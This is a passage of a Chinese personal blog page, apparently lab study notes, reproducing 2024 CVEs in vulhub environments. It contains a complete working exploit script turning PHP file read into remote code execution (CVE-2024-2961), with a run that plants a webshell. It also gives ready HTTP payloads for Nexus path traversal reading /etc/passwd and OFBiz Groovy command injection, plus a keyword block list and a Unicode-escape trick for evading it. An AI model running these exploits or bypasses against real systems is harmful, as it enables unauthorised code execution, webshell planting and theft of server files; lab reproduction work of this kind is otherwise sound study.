<!DOCTYPE html><html class="appearance-auto" lang="en"><head><meta charset="UTF-8"><title>vulhub_cve2024s</title><meta name="description" content="Buona notte"><meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no, initial-scale=1"><!-- Google Analytics --><!-- End Google Analytics -->
<!-- Baidu Analytics --><!-- End Baidu Analytics --><link rel="icon" href="/images/favicon.ico"><link rel="stylesheet" href="/style/common/bulma.css"><link rel="stylesheet" href="/style/base.css"><link rel="stylesheet" href="/style/common/helper.css"><script src="/js/common.js"></script><link rel="stylesheet" href="/style/post.css"><link rel="stylesheet" href="/style/themes/highlight-theme-light.css"><link rel="stylesheet" href="/style/common/jquery.fancybox.min.css"><script src="/js/highlight.pack.js"></script><meta name="description" content="紧急备考
PHP利用GNU C Iconv将文件读取变成RCE（CVE-2024-2961）GNU C 是一个标准的ISO C依赖库。在GNU C中，iconv()函数2.39及以前存在一处缓冲区溢出漏洞，这可能会导致应用程序崩溃或覆盖相邻变量。
如果一个PHP应用中存在任意文件读取漏洞，攻击者可以利用iconv()的这个CVE-2024-2961漏洞，将其提升为代码执行漏洞。
按照要求配置好环境，下载exp：

    #!/usr/bin/env python3
#
# CNEXT: PHP file-read to RCE (CVE-2024-2961)
# Date: 2024-05-27
# Author: Charles FOL @cfreal_ (LEXFO/AMBIONICS)
#
# TO.."><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="Salve" type="application/atom+xml">
</head><body class="is-flex is-flex-direction-column"><header class="header-widget is-flex-shrink-0 is-hidden-mobile"><div class="container is-fullhd is-flex is-justify-content-space-between is-align-items-center is-full-height"><section class="is-hidden-mobile is-flex-shrink-0"><h2><a href="/">Taninluv's blog</a></h2></section><h3 class="is-hidden-mobile is-family-serif is-full-height is-flex is-align-items-center is-flex-shrink-0"><div class="is-full-height" id="postTopic"><p class="is-full-height is-flex-shrink-0 is-flex is-align-items-center is-justify-content-center">vulhub_cve2024s</p><p class="is-full-height is-flex-shrink-0 is-flex is-align-items-center is-justify-content-center">Click back to the top</p></div></h3><aside class="is-flex-shrink-0"><h3 class="is-inline-block"><a href="/">Home</a></h3><h3 class="is-inline-block"><a href="/archives">Archives</a></h3></aside></div></header><header class="is-flex header-widget is-flex-shrink-0 is-align-items-center is-justify-content-center is-hidden-tablet"><h3 class="is-inline-block"><a href="/">Home</a></h3><h3 class="is-inline-block"><a href="/archives">Archives</a></h3></header><main><main class="container is-max-widescreen content section post-page pt-4 px-4"><div class="columns is-flex-desktop is-justify-content-center is-flex-direction-row-reverse"><div class="column is-3 is-hidden-mobile"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#PHP%E5%88%A9%E7%94%A8GNU-C-Iconv%E5%B0%86%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E5%8F%98%E6%88%90RCE%EF%BC%88CVE-2024-2961%EF%BC%89"><span class="toc-text">PHP利用GNU C Iconv将文件读取变成RCE（CVE-2024-2961）</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Nexus-Repository-Manager-3-%E6%9C%AA%E6%8E%88%E6%9D%83%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2024-4956%EF%BC%89"><span class="toc-text">Nexus Repository Manager 3 未授权目录穿越漏洞（CVE-2024-4956）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#poc"><span class="toc-text">poc</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Apache-OFBiz-%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87%E5%AF%BC%E8%87%B4%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-CVE-2024-38856"><span class="toc-text">Apache OFBiz 身份验证绕过导致远程代码执行 (CVE-2024-38856)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Apache-OFBiz-%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87%E5%AF%BC%E8%87%B4%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%EF%BC%88CVE-2024-45195%EF%BC%89"><span class="toc-text">Apache OFBiz 身份验证绕过导致远程代码执行（CVE-2024-45195）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%99%84"><span class="toc-text">附</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2024-32113"><span class="toc-text">CVE-2024-32113</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2024-36104"><span class="toc-text">CVE-2024-36104</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2024-38856"><span class="toc-text">CVE-2024-38856</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2023-51467"><span class="toc-text">CVE-2023-51467</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Apache-OFBiz-SSRF-%E5%92%8C%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2024-45507%EF%BC%89"><span class="toc-text">Apache OFBiz SSRF 和远程代码执行漏洞（CVE-2024-45507）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SSRF%E6%BC%8F%E6%B4%9E"><span class="toc-text">SSRF漏洞</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Jenkins-CLI-%E6%8E%A5%E5%8F%A3%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2024-23897%EF%BC%89"><span class="toc-text">Jenkins CLI 接口任意文件读取漏洞（CVE-2024-23897）</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#GeoServer-%E5%B1%9E%E6%80%A7%E5%90%8D%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%89%8D%E5%8F%B0%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2024-36401%EF%BC%89"><span class="toc-text">GeoServer 属性名表达式前台代码执行漏洞（CVE-2024-36401）</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#AJ-Report-%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E4%B8%8E%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88CNVD-2024-15077%EF%BC%89"><span class="toc-text">AJ-Report 认证绕过与远程代码执行漏洞（CNVD-2024-15077）</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#OpenPrinting-Cups-Browsed-PDD-FoomaticRIPCommandLine-%E5%8F%82%E6%95%B0%E5%AF%BC%E8%87%B4%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2024-47177%EF%BC%89"><span class="toc-text">OpenPrinting Cups-Browsed PDD FoomaticRIPCommandLine 参数导致远程命令执行漏洞（CVE-2024-47177）</span></a></li></ol></div><div class="column is-9"><header class="my-4"><a href="/tags/%E7%B4%A7%E6%80%A5%E5%A4%87%E8%80%832024"><i class="tag post-item-tag">紧急备考2024</i></a></header><h1 class="mt-0 mb-1 is-family-serif" id="postTitle">vulhub_cve2024s</h1><time class="has-text-grey" datetime="2024-11-18T15:15:27.000Z">2024-11-18</time><article class="mt-2 post-content"><p>紧急备考</p>
<h1 id="PHP利用GNU-C-Iconv将文件读取变成RCE（CVE-2024-2961）"><a href="#PHP利用GNU-C-Iconv将文件读取变成RCE（CVE-2024-2961）" class="headerlink" title="PHP利用GNU C Iconv将文件读取变成RCE（CVE-2024-2961）"></a>PHP利用GNU C Iconv将文件读取变成RCE（CVE-2024-2961）</h1><p>GNU C 是一个标准的ISO C依赖库。在GNU C中，<code>iconv()</code>函数2.39及以前存在一处缓冲区溢出漏洞，这可能会导致应用程序崩溃或覆盖相邻变量。</p>
<p>如果一个PHP应用中存在任意文件读取漏洞，攻击者可以利用<code>iconv()</code>的这个CVE-2024-2961漏洞，将其提升为代码执行漏洞。</p>
<p>按照要求配置好环境，下载exp：</p>
<details>
    #!/usr/bin/env python3
#
# CNEXT: PHP file-read to RCE (CVE-2024-2961)
# Date: 2024-05-27
# Author: Charles FOL @cfreal_ (LEXFO/AMBIONICS)
#
# TODO Parse LIBC to know if patched
#
# INFORMATIONS
#
# To use, implement the Remote class, which tells the exploit how to send the payload.
#
from __future__ import annotations
import base64
import zlib
from dataclasses import dataclass
from requests.exceptions import ConnectionError, ChunkedEncodingError
from pwn import *
from ten import *
HEAP_SIZE = 2 * 1024 * 1024
BUG = "劄".encode("utf-8")
class Remote:
    """A helper class to send the payload and download files.
    The logic of the exploit is always the same, but the exploit needs to know how to
    download files (/proc/self/maps and libc) and how to send the payload.
    The code here serves as an example that attacks a page that looks like:
    ```php
    <?php
    $data = file_get_contents($_POST['file']);
    echo "File contents: $data";
    ```
    Tweak it to fit your target, and start the exploit.
    """
    def __init__(self, url: str) -> None:
        self.url = url
        self.session = Session()
    def send(self, path: str) -> Response:
        """Sends given `path` to the HTTP server. Returns the response.
        """
        return self.session.post(self.url, data={"file": path})
    def download(self, path: str) -> bytes:
        """Returns the contents of a remote file.
        """
        path = f"php://filter/convert.base64-encode/resource={path}"
        response = self.send(path)
        data = response.re.search(b"File contents: (.*)", flags=re.S).group(1)
        return base64.decode(data)
@entry
@arg("url", "Target URL")
@arg("command", "Command to run on the system; limited to 0x140 bytes")
@arg("sleep", "Time to sleep to assert that the exploit worked. By default, 1.")
@arg("heap", "Address of the main zend_mm_heap structure.")
@arg(
    "pad",
    "Number of 0x100 chunks to pad with. If the website makes a lot of heap "
    "operations with this size, increase this. Defaults to 20.",
)
@dataclass
class Exploit:
    """CNEXT exploit: RCE using a file read primitive in PHP."""
    url: str
    command: str
    sleep: int = 1
    heap: str = None
    pad: int = 20
    def __post_init__(self):
        self.remote = Remote(self.url)
        self.log = logger("EXPLOIT")
        self.info = {}
        self.heap = self.heap and int(self.heap, 16)
    def check_vulnerable(self) -> None:
        """Checks whether the target is reachable and properly allows for the various
        wrappers and filters that the exploit needs.
        """
        def safe_download(path: str) -> bytes:
            try:
                return self.remote.download(path)
            except ConnectionError:
                failure("Target not [b]reachable[/] ?")     
        def check_token(text: str, path: str) -> bool:
            result = safe_download(path)
            return text.encode() == result
        text = tf.random.string(50).encode()
        base64 = b64(text, misalign=True).decode()
        path = f"data:text/plain;base64,{base64}"
        result = safe_download(path)
        if text not in result:
            msg_failure("Remote.download did not return the test string")
            print("--------------------")
            print(f"Expected test string: {text}")
            print(f"Got: {result}")
            print("--------------------")
            failure("If your code works fine, it means that the [i]data://[/] wrapper does not work")
        msg_info("The [i]data://[/] wrapper works")
        text = tf.random.string(50)
        base64 = b64(text.encode(), misalign=True).decode()
        path = f"php://filter//resource=data:text/plain;base64,{base64}"
        if not check_token(text, path):
            failure("The [i]php://filter/[/] wrapper does not work")
        msg_info("The [i]php://filter/[/] wrapper works")
        text = tf.random.string(50)
        base64 = b64(compress(text.encode()), misalign=True).decode()
        path = f"php://filter/zlib.inflate/resource=data:text/plain;base64,{base64}"
        if not check_token(text, path):
            failure("The [i]zlib[/] extension is not enabled")
        msg_info("The [i]zlib[/] extension is enabled")
        msg_success("Exploit preconditions are satisfied")
    def get_file(self, path: str) -> bytes:
        with msg_status(f"Downloading [i]{path}[/]..."):
            return self.remote.download(path)
    def get_regions(self) -> list[Region]:
        """Obtains the memory regions of the PHP process by querying /proc/self/maps."""
        maps = self.get_file("/proc/self/maps")
        maps = maps.decode()
        PATTERN = re.compile(
            r"^([a-f0-9]+)-([a-f0-9]+)\b" r".*" r"\s([-rwx]{3}[ps])\s" r"(.*)"
        )
        regions = []
        for region in table.split(maps, strip=True):
            if match := PATTERN.match(region):
                start = int(match.group(1), 16)
                stop = int(match.group(2), 16)
                permissions = match.group(3)
                path = match.group(4)
                if "/" in path or "[" in path:
                    path = path.rsplit(" ", 1)[-1]
                else:
                    path = ""
                current = Region(start, stop, permissions, path)
                regions.append(current)
            else:
                print(maps)
                failure("Unable to parse memory mappings")
        self.log.info(f"Got {len(regions)} memory regions")
        return regions
    def get_symbols_and_addresses(self) -> None:
        """Obtains useful symbols and addresses from the file read primitive."""
        regions = self.get_regions()
        LIBC_FILE = "/dev/shm/cnext-libc"
        # PHP's heap
        self.info["heap"] = self.heap or self.find_main_heap(regions)
        # Libc
        libc = self._get_region(regions, "libc-", "libc.so")
        self.download_file(libc.path, LIBC_FILE)
        self.info["libc"] = ELF(LIBC_FILE, checksec=False)
        self.info["libc"].address = libc.start
    def _get_region(self, regions: list[Region], *names: str) -> Region:
        """Returns the first region whose name matches one of the given names."""
        for region in regions:
            if any(name in region.path for name in names):
                break
        else:
            failure("Unable to locate region")
        return region
    def download_file(self, remote_path: str, local_path: str) -> None:
        """Downloads `remote_path` to `local_path`"""
        data = self.get_file(remote_path)
        Path(local_path).write(data)
    def find_main_heap(self, regions: list[Region]) -> Region:
        # Any anonymous RW region with a size superior to the base heap size is a
        # candidate. The heap is at the bottom of the region.
        heaps = [
            region.stop - HEAP_SIZE + 0x40
            for region in reversed(regions)
            if region.permissions == "rw-p"
            and region.size >= HEAP_SIZE
            and region.stop & (HEAP_SIZE-1) == 0
            and region.path in ("", "[anon:zend_alloc]")
        ]
        if not heaps:
            failure("Unable to find PHP's main heap in memory")
        first = heaps[0]
        if len(heaps) > 1:
            heaps = ", ".join(map(hex, heaps))
            msg_info(f"Potential heaps: [i]{heaps}[/] (using first)")
        else:
            msg_info(f"Using [i]{hex(first)}[/] as heap")
        return first
    def run(self) -> None:
        self.check_vulnerable()
        self.get_symbols_and_addresses()
        self.exploit()
    def build_exploit_path(self) -> str:
        """On each step of the exploit, a filter will process each chunk one after the
        other. Processing generally involves making some kind of operation either
        on the chunk or in a destination chunk of the same size. Each operation is
        applied on every single chunk; you cannot make PHP apply iconv on the first 10
        chunks and leave the rest in place. That's where the difficulties come from.
        Keep in mind that we know the address of the main heap, and the libraries.
        ASLR/PIE do not matter here.
        The idea is to use the bug to make the freelist for chunks of size 0x100 point
        lower. For instance, we have the following free list:
        ... -> 0x7fffAABBCC900 -> 0x7fffAABBCCA00 -> 0x7fffAABBCCB00
        By triggering the bug from chunk ..900, we get:
        ... -> 0x7fffAABBCCA00 -> 0x7fffAABBCCB48 -> ???
        That's step 3.
        Now, in order to control the free list, and make it point whereever we want,
        we need to have previously put a pointer at address 0x7fffAABBCCB48. To do so,
        we'd have to have allocated 0x7fffAABBCCB00 and set our pointer at offset 0x48.
        That's step 2.
        Now, if we were to perform step2 an then step3 without anything else, we'd have
        a problem: after step2 has been processed, the free list goes bottom-up, like:
        0x7fffAABBCCB00 -> 0x7fffAABBCCA00 -> 0x7fffAABBCC900
        We need to go the other way around. That's why we have step 1: it just allocates
        chunks. When they get freed, they reverse the free list. Now step2 allocates in
        reverse order, and therefore after step2, chunks are in the correct order.
        Another problem comes up.
        To trigger the overflow in step3, we convert from UTF-8 to ISO-2022-CN-EXT.
        Since step2 creates chunks that contain pointers and pointers are generally not
        UTF-8, we cannot afford to have that conversion happen on the chunks of step2.
        To avoid this, we put the chunks in step2 at the very end of the chain, and
        prefix them with `0\n`. When dechunked (right before the iconv), they will
        "disappear" from the chain, preserving them from the character set conversion
        and saving us from an unwanted processing error that would stop the processing
        chain.
        After step3 we have a corrupted freelist with an arbitrary pointer into it. We
        don't know the precise layout of the heap, but we know that at the top of the
        heap resides a zend_mm_heap structure. We overwrite this structure in two ways.
        Its free_slot[] array contains a pointer to each free list. By overwriting it,
        we can make PHP allocate chunks whereever we want. In addition, its custom_heap
        field contains pointers to hook functions for emalloc, efree, and erealloc
        (similarly to malloc_hook, free_hook, etc. in the libc). We overwrite them and
        then overwrite the use_custom_heap flag to make PHP use these function pointers
        instead. We can now do our favorite CTF technique and get a call to
        system(<chunk>).
        We make sure that the "system" command kills the current process to avoid other
        system() calls with random chunk data, leading to undefined behaviour.
        The pad blocks just "pad" our allocations so that even if the heap of the
        process is in a random state, we still get contiguous, in order chunks for our
        exploit.
        Therefore, the whole process described here CANNOT crash. Everything falls
        perfectly in place, and nothing can get in the middle of our allocations.
        """
        LIBC = self.info["libc"]
        ADDR_EMALLOC = LIBC.symbols["__libc_malloc"]
        ADDR_EFREE = LIBC.symbols["__libc_system"]
        ADDR_EREALLOC = LIBC.symbols["__libc_realloc"]
        ADDR_HEAP = self.info["heap"]
        ADDR_FREE_SLOT = ADDR_HEAP + 0x20
        ADDR_CUSTOM_HEAP = ADDR_HEAP + 0x0168
        ADDR_FAKE_BIN = ADDR_FREE_SLOT - 0x10
        CS = 0x100
        # Pad needs to stay at size 0x100 at every step
        pad_size = CS - 0x18
        pad = b"\x00" * pad_size
        pad = chunked_chunk(pad, len(pad) + 6)
        pad = chunked_chunk(pad, len(pad) + 6)
        pad = chunked_chunk(pad, len(pad) + 6)
        pad = compressed_bucket(pad)
        step1_size = 1
        step1 = b"\x00" * step1_size
        step1 = chunked_chunk(step1)
        step1 = chunked_chunk(step1)
        step1 = chunked_chunk(step1, CS)
        step1 = compressed_bucket(step1)
        # Since these chunks contain non-UTF-8 chars, we cannot let it get converted to
        # ISO-2022-CN-EXT. We add a `0\n` that makes the 4th and last dechunk "crash"
        step2_size = 0x48
        step2 = b"\x00" * (step2_size + 8)
        step2 = chunked_chunk(step2, CS)
        step2 = chunked_chunk(step2)
        step2 = compressed_bucket(step2)
        step2_write_ptr = b"0\n".ljust(step2_size, b"\x00") + p64(ADDR_FAKE_BIN)
        step2_write_ptr = chunked_chunk(step2_write_ptr, CS)
        step2_write_ptr = chunked_chunk(step2_write_ptr)
        step2_write_ptr = compressed_bucket(step2_write_ptr)
        step3_size = CS
        step3 = b"\x00" * step3_size
        assert len(step3) == CS
        step3 = chunked_chunk(step3)
        step3 = chunked_chunk(step3)
        step3 = chunked_chunk(step3)
        step3 = compressed_bucket(step3)
        step3_overflow = b"\x00" * (step3_size - len(BUG)) + BUG
        assert len(step3_overflow) == CS
        step3_overflow = chunked_chunk(step3_overflow)
        step3_overflow = chunked_chunk(step3_overflow)
        step3_overflow = chunked_chunk(step3_overflow)
        step3_overflow = compressed_bucket(step3_overflow)
        step4_size = CS
        step4 = b"=00" + b"\x00" * (step4_size - 1)
        step4 = chunked_chunk(step4)
        step4 = chunked_chunk(step4)
        step4 = chunked_chunk(step4)
        step4 = compressed_bucket(step4)
        # This chunk will eventually overwrite mm_heap->free_slot
        # it is actually allocated 0x10 bytes BEFORE it, thus the two filler values
        step4_pwn = ptr_bucket(
            0x200000,
            0,
            # free_slot
            0,
            0,
            ADDR_CUSTOM_HEAP,  # 0x18
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            ADDR_HEAP,  # 0x140
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            size=CS,
        )
        step4_custom_heap = ptr_bucket(
            ADDR_EMALLOC, ADDR_EFREE, ADDR_EREALLOC, size=0x18
        )
        step4_use_custom_heap_size = 0x140
        COMMAND = self.command
        COMMAND = f"kill -9 $PPID; {COMMAND}"
        if self.sleep:
            COMMAND = f"sleep {self.sleep}; {COMMAND}"
        COMMAND = COMMAND.encode() + b"\x00"
        assert (
            len(COMMAND) <= step4_use_custom_heap_size
        ), f"Command too big ({len(COMMAND)}), it must be strictly inferior to {hex(step4_use_custom_heap_size)}"
        COMMAND = COMMAND.ljust(step4_use_custom_heap_size, b"\x00")
        step4_use_custom_heap = COMMAND
        step4_use_custom_heap = qpe(step4_use_custom_heap)
        step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)
        step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)
        step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)
        step4_use_custom_heap = compressed_bucket(step4_use_custom_heap)
        pages = (
            step4 * 3
            + step4_pwn
            + step4_custom_heap
            + step4_use_custom_heap
            + step3_overflow
            + pad * self.pad
            + step1 * 3
            + step2_write_ptr
            + step2 * 2
        )
        resource = compress(compress(pages))
        resource = b64(resource)
        resource = f"data:text/plain;base64,{resource.decode()}"
        filters = [
            # Create buckets
            "zlib.inflate",
            "zlib.inflate",
            # Step 0: Setup heap
            "dechunk",
            "convert.iconv.L1.L1",
            # Step 1: Reverse FL order
            "dechunk",
            "convert.iconv.L1.L1",
            # Step 2: Put fake pointer and make FL order back to normal
            "dechunk",
            "convert.iconv.L1.L1",
            # Step 3: Trigger overflow
            "dechunk",
            "convert.iconv.UTF-8.ISO-2022-CN-EXT",
            # Step 4: Allocate at arbitrary address and change zend_mm_heap
            "convert.quoted-printable-decode",
            "convert.iconv.L1.L1",
        ]
        filters = "|".join(filters)
        path = f"php://filter/read={filters}/resource={resource}"
        return path
    @inform("Triggering...")
    def exploit(self) -> None:
        path = self.build_exploit_path()
        start = time.time()
        try:
            self.remote.send(path)
        except (ConnectionError, ChunkedEncodingError):
            pass
        msg_print()
        if not self.sleep:
            msg_print("    [b white on black] EXPLOIT [/][b white on green] SUCCESS [/] [i](probably)[/]")
        elif start + self.sleep <= time.time():
            msg_print("    [b white on black] EXPLOIT [/][b white on green] SUCCESS [/]")
        else:
            # Wrong heap, maybe? If the exploited suggested others, use them!
            msg_print("    [b white on black] EXPLOIT [/][b white on red] FAILURE [/]")
        msg_print()
def compress(data) -> bytes:
    """Returns data suitable for `zlib.inflate`.
    """
    # Remove 2-byte header and 4-byte checksum
    return zlib.compress(data, 9)[2:-4]
def b64(data: bytes, misalign=True) -> bytes:
    payload = base64.encode(data)
    if not misalign and payload.endswith("="):
        raise ValueError(f"Misaligned: {data}")
    return payload.encode()
def compressed_bucket(data: bytes) -> bytes:
    """Returns a chunk of size 0x8000 that, when dechunked, returns the data."""
    return chunked_chunk(data, 0x8000)
def qpe(data: bytes) -> bytes:
    """Emulates quoted-printable-encode.
    """
    return "".join(f"={x:02x}" for x in data).upper().encode()
def ptr_bucket(*ptrs, size=None) -> bytes:
    """Creates a 0x8000 chunk that reveals pointers after every step has been ran."""
    if size is not None:
        assert len(ptrs) * 8 == size
    bucket = b"".join(map(p64, ptrs))
    bucket = qpe(bucket)
    bucket = chunked_chunk(bucket)
    bucket = chunked_chunk(bucket)
    bucket = chunked_chunk(bucket)
    bucket = compressed_bucket(bucket)
    return bucket
def chunked_chunk(data: bytes, size: int = None) -> bytes:
    """Constructs a chunked representation of the given chunk. If size is given, the
    chunked representation has size `size`.
    For instance, `ABCD` with size 10 becomes: `0004\nABCD\n`.
    """
    # The caller does not care about the size: let's just add 8, which is more than
    # enough
    if size is None:
        size = len(data) + 8
    keep = len(data) + len(b"\n\n")
    size = f"{len(data):x}".rjust(size - keep, "0")
    return size.encode() + b"\n" + data + b"\n"
@dataclass
class Region:
    """A memory region."""
    start: int
    stop: int
    permissions: str
    path: str
    @property
    def size(self) -> int:
        return self.stop - self.start
Exploit()
</details>

<pre><code>└─# python exp.py http://127.0.0.1:8080/index.php &quot;echo &#39;&lt;?=phpinfo();?&gt;&#39; &gt; shell.php&quot;

[*] The data:// wrapper works
[*] The php://filter/ wrapper works
[*] The zlib extension is enabled
[+] Exploit preconditions are satisfied
[*] Using 0x7fcdcb800040 as heap

     EXPLOIT  SUCCESS 
</code></pre>
<p>访问<code>shell.php</code>复现成功</p>
<h1 id="Nexus-Repository-Manager-3-未授权目录穿越漏洞（CVE-2024-4956）"><a href="#Nexus-Repository-Manager-3-未授权目录穿越漏洞（CVE-2024-4956）" class="headerlink" title="Nexus Repository Manager 3 未授权目录穿越漏洞（CVE-2024-4956）"></a>Nexus Repository Manager 3 未授权目录穿越漏洞（CVE-2024-4956）</h1><p>Nexus Repository Manager 3 是一款软件仓库，可以用来存储和分发Maven、NuGET等软件源仓库。</p>
<p>其3.68.0及之前版本中，存在一处目录穿越漏洞。攻击者可以利用该漏洞读取服务器上任意文件。</p>
<p>与Orange Tsai在<a target="_blank" rel="noopener" href="https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf">Blackhat US 2018</a>分享的SpringMVC CVE-2018-1271漏洞类似，Jetty的<code>URIUtil.canonicalPath()</code>函数也将空字符串认为是一个合法目录，导致了该漏洞的产生：</p>
<p><img src="/img/2.png" alt="img"></p>
<p>这玩意儿运行在8081端口,界面：</p>
<p><img src="/img/2dbae64b4b81458e8d19058af7e49e85.png" alt="img"></p>
<h2 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h2><pre><code>GET /%2F%2F%2F%2F%2F%2F%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1
Host: localhost:8081
Accept-Encoding: gzip, deflate, br
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.159 Safari/537.36
Connection: close
Cache-Control: max-age=0
</code></pre>
<p><code>/etc/passwd</code>被成功读取</p>
<h1 id="Apache-OFBiz-身份验证绕过导致远程代码执行-CVE-2024-38856"><a href="#Apache-OFBiz-身份验证绕过导致远程代码执行-CVE-2024-38856" class="headerlink" title="Apache OFBiz 身份验证绕过导致远程代码执行 (CVE-2024-38856)"></a>Apache OFBiz 身份验证绕过导致远程代码执行 (CVE-2024-38856)</h1><p>Apache OFBiz 是一个开源的企业资源规划（ERP）系统。它提供了一套企业应用程序，用于集成和自动化企业的许多业务流程。</p>
<p>这个漏洞是由于对 CVE-2023-51467 的不完全修复而产生的。在 Apache OFBiz 18.12.11 版本中，开发人员认为他们已经修复了该漏洞，但实际上他们只解决了其中一种利用方法。Groovy 表达式注入仍然存在，允许未经授权的用户在服务器上执行任意命令。</p>
<p>访问<code>https://localhost:8443/accounting</code>查看到登录页面，说明环境已启动成功。</p>
<p><img src="/img/image-20241119001325262.png" alt="image-20241119001325262"></p>
<p>poc</p>
<pre><code>POST /webtools/control/main/ProgramExport HTTP/1.1
Host: localhost:8443
Accept-Encoding: gzip, deflate, br
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.127 Safari/537.36
Connection: close
Cache-Control: max-age=0
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryDbR7sY3IIwQX7kcJ
Content-Length: 190

------WebKitFormBoundaryDbR7sY3IIwQX7kcJ
Content-Disposition: form-data; name=&quot;groovyProgram&quot;

throw new Exception(&#39;id&#39;.\u0065xecute().text);
------WebKitFormBoundaryDbR7sY3IIwQX7kcJ--
</code></pre>
<p>成功rce</p>
<p>值得注意的是，Apache Ofbiz限制了如下一些关键词的使用，我们可以通过Unicode编码来绕过这个限制，比如<code>\u0065xecute</code>：</p>
<pre><code>deniedWebShellTokens=java.,beans,freemarker,&lt;script,javascript,&lt;body,body ,&lt;form,&lt;jsp:,&lt;c:out,taglib,&lt;prefix,&lt;%@ page,&lt;?php,exec(,alert(,\
                     %eval,@eval,eval(,runtime,import,passthru,shell_exec,assert,str_rot13,system,decode,include,page ,\
                     chmod,mkdir,fopen,fclose,new file,upload,getfilename,download,getoutputstring,readfile,iframe,object,embed,onload,build,\
                     python,perl ,/perl,ruby ,/ruby,process,function,class,InputStream,to_server,wget ,static,assign,webappPath,\
                     ifconfig,route,crontab,netstat,uname ,hostname,iptables,whoami,&quot;cmd&quot;,*cmd|,+cmd|,=cmd|,localhost,thread,require,gzdeflate,\
                     execute,println,calc,touch,calculate
</code></pre>
<p>附php的Unicode加解码：</p>
<details>
    1. 将字符转换为 Unicode 编码
要将普通字符串转换为 Unicode 转义序列（如 \u0065），可以使用以下方法：
php
复制代码
function unicode_encode($str) {
    $encoded = '';
    for ($i = 0; $i < mb_strlen($str, 'UTF-8'); $i++) {
        $char = mb_substr($str, $i, 1, 'UTF-8');
        $code = unpack('N', mb_convert_encoding($char, 'UCS-4BE', 'UTF-8'));
        $encoded .= sprintf('\u%04x', $code[1]);
    }
    return $encoded;
}
echo unicode_encode("Hello"); // 输出 \u0048\u0065\u006c\u006c\u006f
2. 解码 Unicode 转义序列
将 Unicode 转义序列（如 \u0065）解码为普通字符串：
php
复制代码
function unicode_decode($str) {
    return preg_replace_callback('/\\\\u([0-9a-fA-F]{4})/', function ($matches) {
        return mb_convert_encoding(pack('H*', $matches[1]), 'UTF-8', 'UCS-2BE');
    }, $str);
}
echo unicode_decode("\u0048\u0065\u006c\u006c\u006f"); // 输出 Hello
</details>





<h1 id="Apache-OFBiz-身份验证绕过导致远程代码执行（CVE-2024-45195）"><a href="#Apache-OFBiz-身份验证绕过导致远程代码执行（CVE-2024-45195）" class="headerlink" title="Apache OFBiz 身份验证绕过导致远程代码执行（CVE-2024-45195）"></a>Apache OFBiz 身份验证绕过导致远程代码执行（CVE-2024-45195）</h1><p>Apache OFBiz是一个开源企业资源规划（ERP）系统。它提供了一套企业应用程序，集成并自动化企业的许多业务流程。</p>
